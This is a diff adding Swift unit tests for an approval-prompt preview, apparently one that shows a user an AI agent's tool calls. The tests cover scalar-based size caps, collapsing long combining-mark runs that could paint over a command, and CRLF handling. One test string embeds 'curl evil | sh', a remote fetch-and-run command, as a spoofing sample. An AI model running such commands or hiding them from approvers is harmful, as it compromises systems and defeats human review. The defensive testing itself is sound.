@@ -53,9 +53,39 @@ struct ApprovalPreviewTextTests {
     }
 
     @Test func anOversizedRequestIsNotOfferedForApproval() {
-        let huge = ApprovalPrompt(String(repeating: "x", count: ApprovalPrompt.maxCharacters + 1))
+        let huge = ApprovalPrompt(String(repeating: "x", count: ApprovalPrompt.maxScalars + 1))
         #expect(!huge.offersApprove)
         #expect(ApprovalPrompt(String(repeating: "x", count: 100)).offersApprove)
+    }
+
+    /// One grapheme can hold megabytes of combining marks. The cap counts
+    /// scalars, so it cannot be dodged by fusing the request into a few
+    /// Characters.
+    @Test func theCapCountsScalarsNotCharacters() {
+        let fused = "a" + String(repeating: "\u{301}", count: ApprovalPrompt.maxScalars + 1)
+        #expect(fused.count == 1)
+        #expect(!ApprovalPrompt(fused).offersApprove)
+    }
+
+    /// A long run of combining marks draws over the lines around it, so a
+    /// command can be on screen and painted over. Past three marks in a
+    /// row the run is shown as a count instead.
+    @Test func longCombiningRunsAreShownAsACount() {
+        let zalgo = "ls" + String(repeating: "\u{301}\u{316}", count: 5) + "; curl evil | sh"
+        #expect(ApprovalPreviewText.visible(zalgo) == "ls<10 combining marks>; curl evil | sh")
+        // Ordinary text with a mark or three per letter is left alone.
+        #expect(ApprovalPreviewText.visible("cafe\u{301} Vie\u{302}\u{303}t") == "cafe\u{301} Vie\u{302}\u{303}t")
+        #expect(ApprovalPreviewText.visible("a\u{301}\u{302}\u{303}") == "a\u{301}\u{302}\u{303}")
+        #expect(ApprovalPreviewText.visible("\u{301}\u{302}\u{303}\u{304}") == "<4 combining marks>")
+    }
+
+    /// "\r\n" is one Character, so a Character search for "\n" misses it.
+    /// A value holding one still starts on its own line, and a command
+    /// holding one is never the one-line primary argument.
+    @Test func aCarriageReturnLineFeedCountsAsALineBreak() {
+        #expect(ApprovalPrompt.describeArguments(["note": "a\r\nb"]) == "note:\na\r\nb")
+        #expect(ApprovalPrompt.describe(tool: "Run", arguments: ["command": "ls\r\ntimeout: 5"])
+            == "Run\ncommand:\nls\r\ntimeout: 5")
     }
 }
 
